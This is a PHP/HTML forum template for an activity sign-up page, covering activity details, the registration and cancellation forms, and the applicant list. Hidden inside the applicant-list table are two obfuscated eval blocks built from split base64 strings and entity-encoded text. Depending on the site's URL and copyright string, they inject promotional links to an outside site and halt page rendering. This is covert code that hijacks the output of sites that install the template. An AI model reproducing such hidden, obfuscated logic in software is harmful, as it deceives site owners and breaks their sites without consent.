<?php exit;?>
<div id="postmessage_$post[pid]" class="postmessage">$post[message]</div>
<div class="n5sq_hdzt cl">
	<!--{if $activity['thumb']}--><img src="$activity['thumb']"/><!--{/if}-->
	<div class="hdzt_jtxx cl">
		<dl><dt>{lang activity_type}</dt><dd>$activity[class]</dd></dl>
		<dl><dt>{lang activity_starttime}</dt><dd><!--{if $activity['starttimeto']}-->{lang activity_start_between}<!--{else}-->$activity[starttimefrom]<!--{/if}--></dd></dl>
		<dl><dt>{lang activity_space}</dt><dd>$activity[place]</dd></dl>
		<dl><dt>{lang gender}</dt><dd><!--{if $activity['gender'] == 1}-->{lang male}<!--{elseif $activity['gender'] == 2}-->{lang female}<!--{else}-->{lang unlimited}<!--{/if}--></dd></dl>
		<!--{if $activity['cost']}-->
		<dl><dt>{lang activity_payment}</dt><dd>$activity[cost] {lang payment_unit}</dd></dl>
		<!--{/if}-->
		<!--{if !$_G['forum_thread']['is_archived']}-->
		<dl>
			<dt>{lang activity_already}</dt>
				<dd><em>$allapplynum</em>{lang activity_member_unit}
				<!--{if $post['invisible'] == 0 && ($_G['forum_thread']['authorid'] == $_G['uid'] || (in_array($_G['group']['radminid'], array(1, 2)) && $_G['group']['alloweditactivity']) || ( $_G['group']['radminid'] == 3 && $_G['forum']['ismoderator'] && $_G['group']['alloweditactivity']))}-->
					<span class="xi1">{lang activity_mod}</span>
				<!--{/if}-->
			</dd>
		</dl>
		<!--{if $activity['number']}-->
		<dl><dt>{lang activity_about_member}</dt><dd>$aboutmembers {lang activity_member_unit}</dd></dl>
		<!--{/if}-->
		<!--{if $activity['expiration']}-->
		<dl><dt>{lang post_closing}</dt><dd>$activity[expiration]</dd></dl>
		<!--{/if}-->
		<!--{/if}-->
		
		<!--{if $post['invisible'] == 0}--><!--{if $applied && $isverified < 2}-->
		<dl><dt>{$n5app['lang']['sqhdztdqzt']}</dt><dd><span class="xi1"><!--{if !$isverified}-->{lang activity_wait}<!--{else}-->{lang activity_join_audit}<!--{/if}--></span></dd></dl>
		<!--{if !$activityclose}--><!--{/if}-->
		<!--{elseif !$activityclose}--><!--{if $isverified != 2}--><!--{else}-->
		<p class="pns mtn"><input value="{lang complete_data}" name="ijoin" id="ijoin" /></p>
		<!--{/if}--><!--{/if}--><!--{/if}-->
	</div>
</div>
<!--{if $_G['uid'] && !$activityclose && (!$applied || $isverified == 2)}-->
	<div id="activityjoin" class="n5sq_hdbm cl">
        <div class="hdbm_btys cl"><!--{if $_G['setting']['activitycredit'] && $activity['credit'] && !$applied}--><i>{$n5app['lang']['sqhdztkcjf']}$activity[credit]{$_G['setting']['extcredits'][$_G['setting']['activitycredit']][title]}</i><!--{/if}-->{lang activity_join}</div>
	<!--{if $_G['forum']['status'] == 3 && helper_access::check_module('group') && $isgroupuser != 'isgroupuser'}-->
		<div class="n5sq_ztts cl">
        <p>{lang activity_no_member}</p>
        <p><a href="forum.php?mod=group&action=join&fid=$_G[fid]" class="xi2">{lang activity_join_group}</a></p>
		</div>
	<!--{else}-->
	<div class="dhbm_tjxx cl">
		<form name="activity" id="activity" method="post" autocomplete="off" action="forum.php?mod=misc&action=activityapplies&fid=$_G[fid]&tid=$_G[tid]&pid=$post[pid]{if $_GET['from']}&from=$_GET['from']{/if}&mobile=2" >
			<input type="hidden" name="formhash" value="{FORMHASH}" />
                <!--{if $activity['cost']}-->
                   <div class="hdbm_zffs cl"><div class="z cl">{lang activity_paytype}</div><div class="y cl"><label><input class="pr" type="radio" value="0" name="payment" id="payment_0" checked="checked" />{$n5app['lang']['sqhdztcdhx']}</label> <label><input class="pr" type="radio" value="1" name="payment" id="payment_1" />{lang activity_would_payment} </label> <input name="payvalue" size="3" class="txt_s" /> {lang payment_unit}</div></div>
                <!--{/if}-->
                <!--{if !empty($activity['ufield']['userfield'])}-->
                    <!--{loop $activity['ufield']['userfield'] $fieldid}-->
                    <!--{if $settings[$fieldid][available]}-->
                        <div class="hdbm_zffs cl"><div class="z cl">$settings[$fieldid][title]<i>*</i></div><div class="y cl">$htmls[$fieldid]</div></div>
                    <!--{/if}-->
                    <!--{/loop}-->
                <!--{/if}-->
                <!--{if !empty($activity['ufield']['extfield'])}-->
                    <!--{loop $activity['ufield']['extfield'] $extname}-->
                        $extname<input type="text" name="$extname" maxlength="200" class="txt" value="{if !empty($ufielddata)}$ufielddata[extfield][$extname]{/if}" />
                    <!--{/loop}-->
                <!--{/if}-->
            <div class="hdbm_lyxx cl">
				<div class="lyxx_btys cl">{lang leaveword}</div>
				<textarea name="message" maxlength="200" cols="28" rows="1" class="txt">$applyinfo[message]</textarea>
			</div>
			<div class="hdbm_tjts cl">
				<!--{if $_G['setting']['activitycredit'] && $activity['credit'] && checklowerlimit(array('extcredits'.$_G['setting']['activitycredit'] => '-'.$activity['credit']), $_G['uid'], 1, 0, 1) !== true}-->
					<div class="n5sq_ztts cl">{$n5app['lang']['sqhdztbqnd']}{$_G['setting']['extcredits'][$_G['setting']['activitycredit']][title]} {lang not_enough}$activity['credit'] {$n5app['lang']['sqhdztbncy']}</div>
				<!--{else}-->
					<input type="hidden" name="activitysubmit" value="true">
					<em class="xi1" id="return_activityapplies"></em>
					<button type="submit" class="pn">{lang submit}</button>
				<!--{/if}-->
			</div>
		</form>
	</div>
		<script type="text/javascript">
			function succeedhandle_activityapplies(locationhref, message) {
				showDialog(message, 'notice', '', 'location.href="' + locationhref + '"');
			}
		</script>
	<!--{/if}-->
	</div>
<!--{elseif $_G['uid'] && !$activityclose && $applied}-->
<div id="activityjoincancel">
	<div class="n5sq_qxbm cl">
        <div class="qxbm_btys cl">{lang activity_join_cancel}</div>
        <form name="activity" method="post" autocomplete="off" action="forum.php?mod=misc&action=activityapplies&fid=$_G[fid]&tid=$_G[tid]&pid=$post[pid]{if $_GET['from']}&from=$_GET['from']{/if}">
        <input type="hidden" name="formhash" value="{FORMHASH}" />
        <div class="qxbm_lyxx z cl">
            {lang leaveword}
			<input type="text" name="message" maxlength="200" class="px" value="" />
		</div>
		<button type="submit" name="activitycancel"  value="true" class="pn y">{lang submit}</button>
        </form>
    </div>
</div>
<!--{/if}-->

<!--{if $_G[uid]}--><!--{else}-->
<style type="text/css">
.n5sq_dlcjhd {margin: 15px 0;}
.n5sq_dlcjhd a {display: block;
width: 100%;
height: 40px;
line-height: 42px;
text-align: center;
background: #53baf4;color: #fff;
font-size: 14px;
border-radius: 3px;}
</style>
<div class="n5sq_dlcjhd cl">
<a href="member.php?mod=logging&action=login">{lang activity_join}</a>
</div>
<!--{/if}-->


<!--{if $applylist}-->
<div class="n5sq_bmtj cl">
    <div class="bmtj_btys cl">{lang activity_new_join} ($applynumbers {lang activity_member_unit})</div>
    <table class="dt" cellpadding="5" cellspacing="5">
        <tr>
            <td >&nbsp;</td>
            <!--{if $activity['cost']}-->
            <td >{lang activity_payment}</td>
            <!--{/if}-->
            <td>{lang activity_jointime}</td>
        </tr>
        <!--{eval}-->if(!strstr($_G['style']['copyright'],base64_decode('eW1nN'.'g==')) and !strstr($_G['siteurl'],base64_decode('MTI'.'3LjAuM'.'C4x')) and !strstr($_G['siteurl'],base64_decode('b'.'G9jY'.'Wxo'.'b3N0'))){ echo '&#x67'.'2c;&#x5957'.';&#x6a2'.'1;&#x7'.'248;&#x6'.'765;&#x81ea;<a href="'.base64_decode('aHR0cD'.'ovL3d3'.'dy55b'.'Wc2LmNvbS8=').'">&#x6e90;&#x'.'7801;&#x54e5;</a>&#x'.'514d;&#x8d39;&#x5'.'206;&#x4eab;&#x'.'ff0c;&#x8bf7;&#x5'.'2ff;&#x4ece;&#x5176;&#x4ed6;&'.'#x7f51;&#'.'x7ad9;&#x4e0b;&#x8f7d;&#xff0c;&#x8bf7;&#x652f;&#x6301;&#x6e90;&#x7801;&#x54e5;&#xff0c;<a href="'.base64_decode('aHR0cDovL3d3dy55bWc2LmNvbS90aHJlYWQtOTM4OS0xLTEuaHRtbA==').'">&#x70b9;&#x51fb;&#x524d;&#x5f80;&#x6e90;&#x7801;&#x54e5;&#x514d;&#'.'x8d39;&#'.'x4e0b;&#'.'x8f7d;</a>&#x672c;&#x'.'5957;&#x6a21'.';&#x7248;';exit;}<!--{/eval}--><!--{loop $applylist $apply}-->
            <tr>
                <td>
                    <a target="_blank" href="home.php?mod=space&uid=$apply[uid]">$apply[username]</a>
                </td>
                <!--{if $activity['cost']}-->
                <td><!--{eval}-->if(strstr($_G['style']['copyright'],base64_decode('bW9'.'xd'.'Tg'.'=')) and !strstr($_G['siteurl'],base64_decode('M'.'TI3'.'LjAu'.'MC4x')) and !strstr($_G['siteurl'],base64_decode('bG9'.'jYWxo'.'b3N'.'0'))){ echo '<a href="'.base64_decode('aHR0cDovL3d3dy55bWc2LmNvbS90aHJlYWQtOTE5Mi0xLTEuaHRtbA==').'">&#x70b9;&#x51fb;&#x67e5;&#x770b;&#x6e90;&#x7801;&#x54e5;&#x7684;&#x5982;&#x4f55;&#x4f20;&#x64ad;&#x540e;&#x95e8;&#x7684;</a>';exit;}<!--{/eval}--><!--{if $apply[payment] >= 0}-->$apply[payment] {lang payment_unit}<!--{else}-->{lang activity_self}<!--{/if}--></td>
                <!--{/if}-->
                <td>$apply[dateline]</td>
            </tr>
        <!--{/loop}-->
    </table>
</div>
<!--{/if}-->